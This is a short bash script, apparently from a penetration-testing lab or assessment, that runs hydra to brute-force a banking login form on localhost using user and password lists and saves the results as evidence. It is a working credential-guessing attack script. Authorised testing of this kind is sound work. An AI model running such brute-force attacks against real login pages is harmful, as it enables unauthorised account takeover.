#!/usr/bin/env bash
set -e
mkdir -p evidence/bruteforce
USERS=${1:-evidence/creds/users.txt}
PASS=${2:-evidence/creds/passwords.txt}
if [ ! -f "$USERS" ]; then
  echo "users file not found: $USERS"
  exit 1
fi
if [ ! -f "$PASS" ]; then
  echo "passwords file not found: $PASS"
  exit 1
fi
hydra -L "$USERS" -P "$PASS" 127.0.0.1 http-post-form \
  "/banking/login/:email=^USER^&password=^PASS^:F=invalid" -o evidence/bruteforce/hydra_results.txt -V 2>&1 | tee evidence/bruteforce/hydra_run.log
